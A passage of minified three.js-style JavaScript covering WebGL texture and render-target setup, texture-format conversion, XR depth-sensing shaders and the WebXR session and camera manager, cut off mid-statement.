vt=s.get(M.depthTexture);if(vt.__renderTarget=M,(!vt.__webglTexture||M.depthTexture.image.width!==M.width||M.depthTexture.image.height!==M.height)&&(M.depthTexture.image.width=M.width,M.depthTexture.image.height=M.height,M.depthTexture.needsUpdate=!0),ot){if(vt.__webglInit===void 0&&(vt.__webglInit=!0,M.depthTexture.addEventListener("dispose",P)),vt.__webglTexture===void 0){vt.__webglTexture=o.createTexture(),i.bindTexture(o.TEXTURE_CUBE_MAP,vt.__webglTexture),pt(o.TEXTURE_CUBE_MAP,M.depthTexture);const Dt=f.convert(M.depthTexture.format),$t=f.convert(M.depthTexture.type);let Ft;M.depthTexture.format===La?Ft=o.DEPTH_COMPONENT24:M.depthTexture.format===Yr&&(Ft=o.DEPTH24_STENCIL8);for(let zt=0;zt<6;zt++)o.texImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+zt,0,Ft,M.width,M.height,0,Dt,$t,null)}}else ht(M.depthTexture,0);const Ct=vt.__webglTexture,Lt=Pe(M),xt=ot?o.TEXTURE_CUBE_MAP_POSITIVE_X+tt:o.TEXTURE_2D,Et=M.depthTexture.format===Yr?o.DEPTH_STENCIL_ATTACHMENT:o.DEPTH_ATTACHMENT;if(M.depthTexture.format===La)$e(M)?h.framebufferTexture2DMultisampleEXT(o.FRAMEBUFFER,Et,xt,Ct,0,Lt):o.framebufferTexture2D(o.FRAMEBUFFER,Et,xt,Ct,0);else if(M.depthTexture.format===Yr)$e(M)?h.framebufferTexture2DMultisampleEXT(o.FRAMEBUFFER,Et,xt,Ct,0,Lt):o.framebufferTexture2D(o.FRAMEBUFFER,Et,xt,Ct,0);else throw new Error("THREE.WebGLTextures: Unknown depthTexture format.")}function le(O){const M=s.get(O),tt=O.isWebGLCubeRenderTarget===!0;if(M.__boundDepthTexture!==O.depthTexture){const ot=O.depthTexture;if(M.__depthDisposeCallback&&M.__depthDisposeCallback(),ot){const vt=()=>{delete M.__boundDepthTexture,delete M.__depthDisposeCallback,ot.removeEventListener("dispose",vt)};ot.addEventListener("dispose",vt),M.__depthDisposeCallback=vt}M.__boundDepthTexture=ot}if(O.depthTexture&&!M.__autoAllocateDepthBuffer)if(tt)for(let ot=0;ot<6;ot++)Le(M.__webglFramebuffer[ot],O,ot);else{const ot=O.texture.mipmaps;ot&&ot.length>0?Le(M.__webglFramebuffer[0],O,0):Le(M.__webglFramebuffer,O,0)}else if(tt){M.__webglDepthbuffer=[];for(let ot=0;ot<6;ot++)if(i.bindFramebuffer(o.FRAMEBUFFER,M.__webglFramebuffer[ot]),M.__webglDepthbuffer[ot]===void 0)M.__webglDepthbuffer[ot]=o.createRenderbuffer(),Rt(M.__webglDepthbuffer[ot],O,!1);else{const vt=O.stencilBuffer?o.DEPTH_STENCIL_ATTACHMENT:o.DEPTH_ATTACHMENT,Ct=M.__webglDepthbuffer[ot];o.bindRenderbuffer(o.RENDERBUFFER,Ct),o.framebufferRenderbuffer(o.FRAMEBUFFER,vt,o.RENDERBUFFER,Ct)}}else{const ot=O.texture.mipmaps;if(ot&&ot.length>0?i.bindFramebuffer(o.FRAMEBUFFER,M.__webglFramebuffer[0]):i.bindFramebuffer(o.FRAMEBUFFER,M.__webglFramebuffer),M.__webglDepthbuffer===void 0)M.__webglDepthbuffer=o.createRenderbuffer(),Rt(M.__webglDepthbuffer,O,!1);else{const vt=O.stencilBuffer?o.DEPTH_STENCIL_ATTACHMENT:o.DEPTH_ATTACHMENT,Ct=M.__webglDepthbuffer;o.bindRenderbuffer(o.RENDERBUFFER,Ct),o.framebufferRenderbuffer(o.FRAMEBUFFER,vt,o.RENDERBUFFER,Ct)}}i.bindFramebuffer(o.FRAMEBUFFER,null)}function ge(O,M,tt){const ot=s.get(O);M!==void 0&&_t(ot.__webglFramebuffer,O,O.texture,o.COLOR_ATTACHMENT0,o.TEXTURE_2D,0),tt!==void 0&&le(O)}function Se(O){const M=O.texture,tt=s.get(O),ot=s.get(M);O.addEventListener("dispose",b);const vt=O.textures,Ct=O.isWebGLCubeRenderTarget===!0,Lt=vt.length>1;if(Lt||(ot.__webglTexture===void 0&&(ot.__webglTexture=o.createTexture()),ot.__version=M.version,d.memory.textures++),Ct){tt.__webglFramebuffer=[];for(let xt=0;xt<6;xt++)if(M.mipmaps&&M.mipmaps.length>0){tt.__webglFramebuffer[xt]=[];for(let Et=0;Et<M.mipmaps.length;Et++)tt.__webglFramebuffer[xt][Et]=o.createFramebuffer()}else tt.__webglFramebuffer[xt]=o.createFramebuffer()}else{if(M.mipmaps&&M.mipmaps.length>0){tt.__webglFramebuffer=[];for(let xt=0;xt<M.mipmaps.length;xt++)tt.__webglFramebuffer[xt]=o.createFramebuffer()}else tt.__webglFramebuffer=o.createFramebuffer();if(Lt)for(let xt=0,Et=vt.length;xt<Et;xt++){const Dt=s.get(vt[xt]);Dt.__webglTexture===void 0&&(Dt.__webglTexture=o.createTexture(),d.memory.textures++)}if(O.samples>0&&$e(O)===!1){tt.__webglMultisampledFramebuffer=o.createFramebuffer(),tt.__webglColorRenderbuffer=[],i.bindFramebuffer(o.FRAMEBUFFER,tt.__webglMultisampledFramebuffer);for(let xt=0;xt<vt.length;xt++){const Et=vt[xt];tt.__webglColorRenderbuffer[xt]=o.createRenderbuffer(),o.bindRenderbuffer(o.RENDERBUFFER,tt.__webglColorRenderbuffer[xt]);const Dt=f.convert(Et.format,Et.colorSpace),$t=f.convert(Et.type),Ft=C(Et.internalFormat,Dt,$t,Et.normalized,Et.colorSpace,O.isXRRenderTarget===!0),zt=Pe(O);o.renderbufferStorageMultisample(o.RENDERBUFFER,zt,Ft,O.width,O.height),o.framebufferRenderbuffer(o.FRAMEBUFFER,o.COLOR_ATTACHMENT0+xt,o.RENDERBUFFER,tt.__webglColorRenderbuffer[xt])}o.bindRenderbuffer(o.RENDERBUFFER,null),O.depthBuffer&&(tt.__webglDepthRenderbuffer=o.createRenderbuffer(),Rt(tt.__webglDepthRenderbuffer,O,!0)),i.bindFramebuffer(o.FRAMEBUFFER,null)}}if(Ct){i.bindTexture(o.TEXTURE_CUBE_MAP,ot.__webglTexture),pt(o.TEXTURE_CUBE_MAP,M);for(let xt=0;xt<6;xt++)if(M.mipmaps&&M.mipmaps.length>0)for(let Et=0;Et<M.mipmaps.length;Et++)_t(tt.__webglFramebuffer[xt][Et],O,M,o.COLOR_ATTACHMENT0,o.TEXTURE_CUBE_MAP_POSITIVE_X+xt,Et);else _t(tt.__webglFramebuffer[xt],O,M,o.COLOR_ATTACHMENT0,o.TEXTURE_CUBE_MAP_POSITIVE_X+xt,0);S(M)&&N(o.TEXTURE_CUBE_MAP),i.unbindTexture()}else if(Lt){for(let xt=0,Et=vt.length;xt<Et;xt++){const Dt=vt[xt],$t=s.get(Dt);let Ft=o.TEXTURE_2D;(O.isWebGL3DRenderTarget||O.isWebGLArrayRenderTarget)&&(Ft=O.isWebGL3DRenderTarget?o.TEXTURE_3D:o.TEXTURE_2D_ARRAY),i.bindTexture(Ft,$t.__webglTexture),pt(Ft,Dt),_t(tt.__webglFramebuffer,O,Dt,o.COLOR_ATTACHMENT0+xt,Ft,0),S(Dt)&&N(Ft)}i.unbindTexture()}else{let xt=o.TEXTURE_2D;if((O.isWebGL3DRenderTarget||O.isWebGLArrayRenderTarget)&&(xt=O.isWebGL3DRenderTarget?o.TEXTURE_3D:o.TEXTURE_2D_ARRAY),i.bindTexture(xt,ot.__webglTexture),pt(xt,M),M.mipmaps&&M.mipmaps.length>0)for(let Et=0;Et<M.mipmaps.length;Et++)_t(tt.__webglFramebuffer[Et],O,M,o.COLOR_ATTACHMENT0,xt,Et);else _t(tt.__webglFramebuffer,O,M,o.COLOR_ATTACHMENT0,xt,0);S(M)&&N(xt),i.unbindTexture()}O.depthBuffer&&le(O)}function ee(O){const M=O.textures;for(let tt=0,ot=M.length;tt<ot;tt++){const vt=M[tt];if(S(vt)){const Ct=B(O),Lt=s.get(vt).__webglTexture;i.bindTexture(Ct,Lt),N(Ct),i.unbindTexture()}}}const ie=[],Ve=[];function fn(O){if(O.samples>0){if($e(O)===!1){const M=O.textures,tt=O.width,ot=O.height;let vt=o.COLOR_BUFFER_BIT;const Ct=O.stencilBuffer?o.DEPTH_STENCIL_ATTACHMENT:o.DEPTH_ATTACHMENT,Lt=s.get(O),xt=M.length>1;if(xt)for(let Dt=0;Dt<M.length;Dt++)i.bindFramebuffer(o.FRAMEBUFFER,Lt.__webglMultisampledFramebuffer),o.framebufferRenderbuffer(o.FRAMEBUFFER,o.COLOR_ATTACHMENT0+Dt,o.RENDERBUFFER,null),i.bindFramebuffer(o.FRAMEBUFFER,Lt.__webglFramebuffer),o.framebufferTexture2D(o.DRAW_FRAMEBUFFER,o.COLOR_ATTACHMENT0+Dt,o.TEXTURE_2D,null,0);i.bindFramebuffer(o.READ_FRAMEBUFFER,Lt.__webglMultisampledFramebuffer);const Et=O.texture.mipmaps;Et&&Et.length>0?i.bindFramebuffer(o.DRAW_FRAMEBUFFER,Lt.__webglFramebuffer[0]):i.bindFramebuffer(o.DRAW_FRAMEBUFFER,Lt.__webglFramebuffer);for(let Dt=0;Dt<M.length;Dt++){if(O.resolveDepthBuffer&&(O.depthBuffer&&(vt|=o.DEPTH_BUFFER_BIT),O.stencilBuffer&&O.resolveStencilBuffer&&(vt|=o.STENCIL_BUFFER_BIT)),xt){o.framebufferRenderbuffer(o.READ_FRAMEBUFFER,o.COLOR_ATTACHMENT0,o.RENDERBUFFER,Lt.__webglColorRenderbuffer[Dt]);const $t=s.get(M[Dt]).__webglTexture;o.framebufferTexture2D(o.DRAW_FRAMEBUFFER,o.COLOR_ATTACHMENT0,o.TEXTURE_2D,$t,0)}o.blitFramebuffer(0,0,tt,ot,0,0,tt,ot,vt,o.NEAREST),m===!0&&(ie.length=0,Ve.length=0,ie.push(o.COLOR_ATTACHMENT0+Dt),O.depthBuffer&&O.storeMultisampledDepthBuffer===!1&&(ie.push(Ct),Ve.push(Ct),o.invalidateFramebuffer(o.DRAW_FRAMEBUFFER,Ve)),o.invalidateFramebuffer(o.READ_FRAMEBUFFER,ie))}if(i.bindFramebuffer(o.READ_FRAMEBUFFER,null),i.bindFramebuffer(o.DRAW_FRAMEBUFFER,null),xt)for(let Dt=0;Dt<M.length;Dt++){i.bindFramebuffer(o.FRAMEBUFFER,Lt.__webglMultisampledFramebuffer),o.framebufferRenderbuffer(o.FRAMEBUFFER,o.COLOR_ATTACHMENT0+Dt,o.RENDERBUFFER,Lt.__webglColorRenderbuffer[Dt]);const $t=s.get(M[Dt]).__webglTexture;i.bindFramebuffer(o.FRAMEBUFFER,Lt.__webglFramebuffer),o.framebufferTexture2D(o.DRAW_FRAMEBUFFER,o.COLOR_ATTACHMENT0+Dt,o.TEXTURE_2D,$t,0)}i.bindFramebuffer(o.DRAW_FRAMEBUFFER,Lt.__webglMultisampledFramebuffer)}else if(O.depthBuffer&&O.storeMultisampledDepthBuffer===!1&&m){const M=O.stencilBuffer?o.DEPTH_STENCIL_ATTACHMENT:o.DEPTH_ATTACHMENT;o.invalidateFramebuffer(o.DRAW_FRAMEBUFFER,[M])}}}function Pe(O){return Math.min(c.maxSamples,O.samples)}function $e(O){const M=s.get(O);return O.samples>0&&e.has("WEBGL_multisampled_render_to_texture")===!0&&M.__useRenderToTexture!==!1}function k(O){const M=d.render.frame;x.get(O)!==M&&(x.set(O,M),O.update())}function en(O,M){const tt=O.colorSpace,ot=O.format,vt=O.type;return O.isCompressedTexture===!0||O.isVideoTexture===!0||tt!==wu&&tt!==gr&&(we.getTransfer(tt)===qe?(ot!==zi||vt!==Ai)&&se("WebGLTextures: sRGB encoded textures have to use RGBAFormat and UnsignedByteType."):Ie("WebGLTextures: Unsupported texture color space:",tt)),M}function Oe(O){return typeof HTMLImageElement<"u"&&O instanceof HTMLImageElement?(p.width=O.naturalWidth||O.width,p.height=O.naturalHeight||O.height):typeof VideoFrame<"u"&&O instanceof VideoFrame?(p.width=O.displayWidth,p.height=O.displayHeight):(p.width=O.width,p.height=O.height),p}this.allocateTextureUnit=q,this.resetTextureUnits=ft,this.getTextureUnits=j,this.setTextureUnits=et,this.setTexture2D=ht,this.setTexture2DArray=lt,this.setTexture3D=mt,this.setTextureCube=gt,this.rebindTextures=ge,this.setupRenderTarget=Se,this.updateRenderTargetMipmap=ee,this.updateMultisampleRenderTarget=fn,this.setupDepthRenderbuffer=le,this.setupFrameBufferTexture=_t,this.useMultisampledRTT=$e,this.isReversedDepthBuffer=function(){return i.buffers.depth.getReversed()}}function b3(o,e){function i(s,c=gr){let f;const d=we.getTransfer(c);if(s===Ai)return o.UNSIGNED_BYTE;if(s===Yp)return o.UNSIGNED_SHORT_4_4_4_4;if(s===Zp)return o.UNSIGNED_SHORT_5_5_5_1;if(s===Gx)return o.UNSIGNED_INT_5_9_9_9_REV;if(s===Vx)return o.UNSIGNED_INT_10F_11F_11F_REV;if(s===Fx)return o.BYTE;if(s===Hx)return o.SHORT;if(s===vl)return o.UNSIGNED_SHORT;if(s===qp)return o.INT;if(s===sa)return o.UNSIGNED_INT;if(s===ia)return o.FLOAT;if(s===oa)return o.HALF_FLOAT;if(s===Xx)return o.ALPHA;if(s===kx)return o.RGB;if(s===zi)return o.RGBA;if(s===La)return o.DEPTH_COMPONENT;if(s===Yr)return o.DEPTH_STENCIL;if(s===Wx)return o.RED;if(s===Kp)return o.RED_INTEGER;if(s===jr)return o.RG;if(s===jp)return o.RG_INTEGER;if(s===Qp)return o.RGBA_INTEGER;if(s===Mu||s===Eu||s===bu||s===Tu)if(d===qe)if(f=e.get("WEBGL_compressed_texture_s3tc_srgb"),f!==null){if(s===Mu)return f.COMPRESSED_SRGB_S3TC_DXT1_EXT;if(s===Eu)return f.COMPRESSED_SRGB_ALPHA_S3TC_DXT1_EXT;if(s===bu)return f.COMPRESSED_SRGB_ALPHA_S3TC_DXT3_EXT;if(s===Tu)return f.COMPRESSED_SRGB_ALPHA_S3TC_DXT5_EXT}else return null;else if(f=e.get("WEBGL_compressed_texture_s3tc"),f!==null){if(s===Mu)return f.COMPRESSED_RGB_S3TC_DXT1_EXT;if(s===Eu)return f.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(s===bu)return f.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(s===Tu)return f.COMPRESSED_RGBA_S3TC_DXT5_EXT}else return null;if(s===cp||s===up||s===fp||s===dp)if(f=e.get("WEBGL_compressed_texture_pvrtc"),f!==null){if(s===cp)return f.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(s===up)return f.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(s===fp)return f.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(s===dp)return f.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}else return null;if(s===hp||s===pp||s===mp||s===gp||s===_p||s===Ru||s===vp)if(f=e.get("WEBGL_compressed_texture_etc"),f!==null){if(s===hp||s===pp)return d===qe?f.COMPRESSED_SRGB8_ETC2:f.COMPRESSED_RGB8_ETC2;if(s===mp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ETC2_EAC:f.COMPRESSED_RGBA8_ETC2_EAC;if(s===gp)return f.COMPRESSED_R11_EAC;if(s===_p)return f.COMPRESSED_SIGNED_R11_EAC;if(s===Ru)return f.COMPRESSED_RG11_EAC;if(s===vp)return f.COMPRESSED_SIGNED_RG11_EAC}else return null;if(s===xp||s===Sp||s===yp||s===Mp||s===Ep||s===bp||s===Tp||s===Ap||s===Rp||s===Cp||s===wp||s===Np||s===Dp||s===Up)if(f=e.get("WEBGL_compressed_texture_astc"),f!==null){if(s===xp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_4x4_KHR:f.COMPRESSED_RGBA_ASTC_4x4_KHR;if(s===Sp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_5x4_KHR:f.COMPRESSED_RGBA_ASTC_5x4_KHR;if(s===yp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_5x5_KHR:f.COMPRESSED_RGBA_ASTC_5x5_KHR;if(s===Mp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_6x5_KHR:f.COMPRESSED_RGBA_ASTC_6x5_KHR;if(s===Ep)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_6x6_KHR:f.COMPRESSED_RGBA_ASTC_6x6_KHR;if(s===bp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_8x5_KHR:f.COMPRESSED_RGBA_ASTC_8x5_KHR;if(s===Tp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_8x6_KHR:f.COMPRESSED_RGBA_ASTC_8x6_KHR;if(s===Ap)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_8x8_KHR:f.COMPRESSED_RGBA_ASTC_8x8_KHR;if(s===Rp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_10x5_KHR:f.COMPRESSED_RGBA_ASTC_10x5_KHR;if(s===Cp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_10x6_KHR:f.COMPRESSED_RGBA_ASTC_10x6_KHR;if(s===wp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_10x8_KHR:f.COMPRESSED_RGBA_ASTC_10x8_KHR;if(s===Np)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_10x10_KHR:f.COMPRESSED_RGBA_ASTC_10x10_KHR;if(s===Dp)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_12x10_KHR:f.COMPRESSED_RGBA_ASTC_12x10_KHR;if(s===Up)return d===qe?f.COMPRESSED_SRGB8_ALPHA8_ASTC_12x12_KHR:f.COMPRESSED_RGBA_ASTC_12x12_KHR}else return null;if(s===Lp||s===Op||s===Pp)if(f=e.get("EXT_texture_compression_bptc"),f!==null){if(s===Lp)return d===qe?f.COMPRESSED_SRGB_ALPHA_BPTC_UNORM_EXT:f.COMPRESSED_RGBA_BPTC_UNORM_EXT;if(s===Op)return f.COMPRESSED_RGB_BPTC_SIGNED_FLOAT_EXT;if(s===Pp)return f.COMPRESSED_RGB_BPTC_UNSIGNED_FLOAT_EXT}else return null;if(s===Ip||s===zp||s===Cu||s===Bp)if(f=e.get("EXT_texture_compression_rgtc"),f!==null){if(s===Ip)return f.COMPRESSED_RED_RGTC1_EXT;if(s===zp)return f.COMPRESSED_SIGNED_RED_RGTC1_EXT;if(s===Cu)return f.COMPRESSED_RED_GREEN_RGTC2_EXT;if(s===Bp)return f.COMPRESSED_SIGNED_RED_GREEN_RGTC2_EXT}else return null;return s===xl?o.UNSIGNED_INT_24_8:o[s]!==void 0?o[s]:null}return{convert:i}}const T3=`
void main() {

	gl_Position = vec4( position, 1.0 );

}`,A3=`
uniform sampler2DArray depthColor;
uniform float depthWidth;
uniform float depthHeight;

void main() {

	vec2 coord = vec2( gl_FragCoord.x / depthWidth, gl_FragCoord.y / depthHeight );

	if ( coord.x >= 1.0 ) {

		gl_FragDepth = texture( depthColor, vec3( coord.x - 1.0, coord.y, 1 ) ).r;

	} else {

		gl_FragDepth = texture( depthColor, vec3( coord.x, coord.y, 0 ) ).r;

	}

}`;class R3{constructor(){this.texture=null,this.mesh=null,this.depthNear=0,this.depthFar=0}init(e,i){if(this.texture===null){const s=new iS(e.texture);(e.depthNear!==i.depthNear||e.depthFar!==i.depthFar)&&(this.depthNear=e.depthNear,this.depthFar=e.depthFar),this.texture=s}}getMesh(e){if(this.texture!==null&&this.mesh===null){const i=e.cameras[0].viewport,s=new la({vertexShader:T3,fragmentShader:A3,uniforms:{depthColor:{value:this.texture},depthWidth:{value:i.z},depthHeight:{value:i.w}}});this.mesh=new Oa(new zu(20,20),s)}return this.mesh}reset(){this.texture=null,this.mesh=null}getDepthTexture(){return this.texture}}class C3 extends Jr{constructor(e,i){super();const s=this;let c=null,f=1,d=null,h="local-floor",m=1,p=null,x=null,v=null,_=null,E=null,T=null;const w=typeof XRWebGLBinding<"u",y=new R3,S={},N=i.getContextAttributes();let B=null,C=null;const U=[],D=[],P=new Ue;let b=null,L=null;const F=new Ti;F.viewport=new ln;const V=new Ti;V.viewport=new ln;const $=[F,V],ft=new Ib;let j=null,et=null;this.cameraAutoUpdate=!0,this.enabled=!1,this.isPresenting=!1,this.getController=function(Y){let ut=U[Y];return ut===void 0&&(ut=new wh,U[Y]=ut),ut.getTargetRaySpace()},this.getControllerGrip=function(Y){let ut=U[Y];return ut===void 0&&(ut=new wh,U[Y]=ut),ut.getGripSpace()},this.getHand=function(Y){let ut=U[Y];return ut===void 0&&(ut=new wh,U[Y]=ut),ut.getHandSpace()};function q(Y){const ut=D.indexOf(Y.inputSource);if(ut===-1)return;const Tt=U[ut];Tt!==void 0&&(Tt.update(Y.inputSource,Y.frame,p||d),Tt.dispatchEvent({type:Y.type,data:Y.inputSource}))}function W(){c.removeEventListener("select",q),c.removeEventListener("selectstart",q),c.removeEventListener("selectend",q),c.removeEventListener("squeeze",q),c.removeEventListener("squeezestart",q),c.removeEventListener("squeezeend",q),c.removeEventListener("end",W),c.removeEventListener("inputsourceschange",ht);for(let Y=0;Y<U.length;Y++){const ut=D[Y];ut!==null&&(D[Y]=null,U[Y].disconnect(ut))}j=null,et=null,y.reset();for(const Y in S)delete S[Y];if(e.setRenderTarget(B),E=null,_=null,v=null,c=null,C=null,At.stop(),s.isPresenting=!1,e.setPixelRatio(b),e.setSize(P.width,P.height,!1),L!==null){const Y=L.camera;Y.fov=L.fov,Y.zoom=L.zoom,Y.updateProjectionMatrix(),L=null}s.dispatchEvent({type:"sessionend"})}this.setFramebufferScaleFactor=function(Y){f=Y,s.isPresenting===!0&&se("WebXRManager: Cannot change framebuffer scale while presenting.")},this.setReferenceSpaceType=function(Y){h=Y,s.isPresenting===!0&&se("WebXRManager: Cannot change reference space type while presenting.")},this.getReferenceSpace=function(){return p||d},this.setReferenceSpace=function(Y){p=Y},this.getBaseLayer=function(){return _!==null?_:E},this.getBinding=function(){return v===null&&w&&(v=new XRWebGLBinding(c,i)),v},this.getFrame=function(){return T},this.getSession=function(){return c},this.setSession=async function(Y){if(c=Y,c!==null){if(B=e.getRenderTarget(),c.addEventListener("select",q),c.addEventListener("selectstart",q),c.addEventListener("selectend",q),c.addEventListener("squeeze",q),c.addEventListener("squeezestart",q),c.addEventListener("squeezeend",q),c.addEventListener("end",W),c.addEventListener("inputsourceschange",ht),N.xrCompatible!==!0&&await i.makeXRCompatible(),b=e.getPixelRatio(),e.getSize(P),w&&"createProjectionLayer"in XRWebGLBinding.prototype){let Tt=null,wt=null,_t=null;N.depth&&(_t=N.stencil?i.DEPTH24_STENCIL8:i.DEPTH_COMPONENT24,Tt=N.stencil?Yr:La,wt=N.stencil?xl:sa);const Rt={colorFormat:i.RGBA8,depthFormat:_t,scaleFactor:f};v=this.getBinding(),_=v.createProjectionLayer(Rt),c.updateRenderState({layers:[_]}),e.setPixelRatio(1),e.setSize(_.textureWidth,_.textureHeight,!1),C=new Bi(_.textureWidth,_.textureHeight,{format:zi,type:Ai,depthTexture:new Sl(_.textureWidth,_.textureHeight,wt,void 0,void 0,void 0,void 0,void 0,void 0,Tt),stencilBuffer:N.stencil,colorSpace:e.outputColorSpace,samples:N.antialias?4:0,resolveDepthBuffer:_.ignoreDepthValues===!1,resolveStencilBuffer:_.ignoreDepthValues===!1,storeMultisampledDepthBuffer:_.ignoreDepthValues===!1,storeMultisampledStencilBuffer:_.ignoreDepthValues===!1})}else{const Tt={antialias:N.antialias,alpha:!0,depth:N.depth,stencil:N.stencil,framebufferScaleFactor:f};E=new XRWebGLLayer(c,i,Tt),c.updateRenderState({baseLayer:E}),e.setPixelRatio(1),e.setSize(E.framebufferWidth,E.framebufferHeight,!1),C=new Bi(E.framebufferWidth,E.framebufferHeight,{format:zi,type:Ai,colorSpace:e.outputColorSpace,stencilBuffer:N.stencil,resolveDepthBuffer:E.ignoreDepthValues===!1,resolveStencilBuffer:E.ignoreDepthValues===!1,storeMultisampledDepthBuffer:E.ignoreDepthValues===!1,storeMultisampledStencilBuffer:E.ignoreDepthValues===!1})}C.isXRRenderTarget=!0,this.setFoveation(m),p=null,d=await c.requestReferenceSpace(h),At.setContext(c),At.start(),s.isPresenting=!0,s.dispatchEvent({type:"sessionstart"})}},this.getEnvironmentBlendMode=function(){if(c!==null)return c.environmentBlendMode},this.getDepthTexture=function(){return y.getDepthTexture()};function ht(Y){for(let ut=0;ut<Y.removed.length;ut++){const Tt=Y.removed[ut],wt=D.indexOf(Tt);wt>=0&&(D[wt]=null,U[wt].disconnect(Tt))}for(let ut=0;ut<Y.added.length;ut++){const Tt=Y.added[ut];let wt=D.indexOf(Tt);if(wt===-1){for(let Rt=0;Rt<U.length;Rt++)if(Rt>=D.length){D.push(Tt),wt=Rt;break}else if(D[Rt]===null){D[Rt]=Tt,wt=Rt;break}if(wt===-1)break}const _t=U[wt];_t&&_t.connect(Tt)}}const lt=new it,mt=new it;function gt(Y,ut,Tt){lt.setFromMatrixPosition(ut.matrixWorld),mt.setFromMatrixPosition(Tt.matrixWorld);const wt=lt.distanceTo(mt),_t=ut.projectionMatrix.elements,Rt=Tt.projectionMatrix.elements,Le=_t[14]/(_t[10]-1),le=_t[14]/(_t[10]+1),ge=(_t[9]+1)/_t[5],Se=(_t[9]-1)/_t[5],ee=(_t[8]-1)/_t[0],ie=(Rt[8]+1)/Rt[0],Ve=Le*ee,fn=Le*ie,Pe=wt/(-ee+ie),$e=Pe*-ee;if(ut.matrixWorld.decompose(Y.position,Y.quaternion,Y.scale),Y.translateX($e),Y.translateZ(Pe),Y.matrixWorld.compose(Y.position,Y.quaternion,Y.scale),Y.matrixWorldInverse.copy(Y.matrixWorld).invert(),_t[10]===-1)Y.projectionMatrix.copy(ut.projectionMatrix),Y.projectionMatrixInverse.copy(ut.projectionMatrixInverse);else{const k=Le+Pe,en=le+Pe,Oe=Ve-$e,O=fn+(wt-$e),M=ge*le/en*k,tt=Se*le/en*k;Y.projectionMatrix.makePerspective(Oe,O,M,tt,k,en),Y.projectionMatrixInverse.copy(Y.projectionMatrix).invert()}}function Bt(Y,ut){ut===null?Y.matrixWorld.copy(Y.matrix):Y.matrixWorld.multiplyMatrices(ut.matrixWorld,Y.matrix),Y.matrixWorldInverse.copy(Y.matrixWorld).invert()}this.updateCamera=function(Y){if(c===null)return;let ut=Y.near,Tt=Y.far;y.texture!==null&&(y.depthNear>0&&(ut=y.depthNear),y.depthFar>0&&(Tt=y.depthFar)),ft.near=V.near=F.near=ut,ft.far=V.far=F.far=Tt,(j!==ft.near||et!==ft.far)&&(c.updateRenderState({depthNear:ft.near,depthFar:ft.far}),j=ft.near,et=ft.far),ft.layers.mask=Y.layers.mask|6,F.layers.mask=ft.layers.mask&-5,V.layers.mask=ft.layers.mask&-3;const wt=Y.parent,_t=ft.cameras;Bt(ft,wt);for(let Rt=0;Rt<_t.length;Rt++)Bt(_t[Rt],wt);_t.length===2?gt(ft,F,V):ft.projectionMatrix.copy(F.projectionMatrix),L===null&&Y.isPerspectiveCamera&&(L={camera:Y,fov:Y.fov,zoom:Y.zoom}),Ut(Y,ft,wt)};function Ut(Y,ut,Tt){Tt===null?Y.matrix.copy(ut.matrixWorld):(Y.matrix.copy(Tt.matrixWorld),Y.matrix.invert(),Y.matrix.multiply(ut.matrixWorld)),Y.matrix.decompose(Y.position,Y.quaternion,Y.scale),Y.updateMatrixWorld(!0),Y.projectionMatrix.copy(ut.projectionMatrix),Y.projectionMatrixInverse.copy(ut.projectionMatrixInverse),Y.isPerspectiveCamera&&(Y.fov=Fp*2*Math.atan(1/Y.projectionMatrix.elements[5]),Y.zoom=1)}this.getCamera=function(){return ft},this.getFoveation=function(){if(!(_===null&&E===null))return m},this.setFoveation=function(Y){m=Y,_!==null&&(_.fixedFoveation=Y),E!==null&&E.fixedFoveation!==void 0&&(E.fixedFoveation=Y)},this.hasDepthSensing=function(){return y.texture!==null},this.getDepthSensingMesh=function(){return y.getMesh(ft)},this.getCameraTexture=function(Y){return S[Y]};let z=null;function pt(Y,ut){if(x=ut.getViewerPose(p||d),T=ut,x!==null){const Tt=x.views;E!==null&&(e.setRenderTargetFramebuffer(C,E.framebuffer),e.setRenderTarget(C));let wt=!1;Tt.length!==ft.cameras.length&&(ft.cameras.length=0,wt=!0);for(let le=0;le<Tt.length;le++){const ge=Tt[le];let Se=null;if(E!==null)Se=E.getViewport(ge);else{const ie=v.getViewSubImage(_,ge);Se=ie.viewport,le===0&&(e.setRenderTargetTextures(C,ie.colorTexture,ie.depthStencilTexture),e.setRenderTarget(C))}let ee=$[le];ee===void 0&&(ee=new Ti,ee.layers.enable(le),ee.viewport=new ln,$[le]=ee),ee.matrix.fromArray(ge.transform.matrix),ee.matrix.decompose(ee.position,ee.quaternion,ee.scale),ee.projectionMatrix.fromArray(ge.projectionMatrix),ee.projectionMatrixInverse.copy(ee.projectionMatrix).invert(),ee.viewport.set(Se.x,Se.y,Se.width,Se.height),le===0&&(ft.matrix.copy(ee.matrix),ft.matrix.decompose(ft.position,ft.quaternion,ft.scale)),wt===!0&&ft.cameras.push(ee)}const _t=c.enabledFeatures;if(_t&&_t.includes("depth-sensing")&&c.depthUsage=="gpu-optimized"&&w){v=s.getBinding();const le=v.getDepthInformation(Tt[0]);le&&le.isValid&&le.texture&&y.init(le,c.renderState)}if(_t&&_t.includes("camera-access")&&w){e.state.unbindTexture(),v=s.getBinding();for(let le=0;le<Tt.length;le++){const ge=Tt[le].camera;if(ge){let Se=S[ge];Se||(Se=new iS,S[ge]=Se);const ee=v.getCameraImage(ge);Se.sourceTexture=ee}}}}for(let Tt=0;Tt<U.length;Tt++){const 